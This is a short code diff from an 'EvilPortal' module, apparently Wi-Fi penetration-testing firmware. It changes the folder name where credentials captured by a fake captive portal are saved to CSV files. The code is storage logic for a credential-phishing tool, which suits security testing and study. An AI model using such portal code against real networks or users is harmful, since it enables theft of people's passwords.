@@ -627,14 +627,14 @@ void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
         return;
     }
 
-    if (!fs->exists("/BruceEvilCreds")) fs->mkdir("/BruceEvilCreds");
+    if (!fs->exists("R4d0nEvilCreds")) fs->mkdir("R4d0nEvilCreds");
 
     File file;
 
     if (!isAPname) {
-        file = fs->open("/BruceEvilCreds/" + outputFile, FILE_APPEND);
+        file = fs->open("R4d0nEvilCreds/" + outputFile, FILE_APPEND);
     } else {
-        file = fs->open("/BruceEvilCreds/" + apName + "_creds.csv", FILE_APPEND);
+        file = fs->open("R4d0nEvilCreds/" + apName + "_creds.csv", FILE_APPEND);
     }
 
     if (!file) {
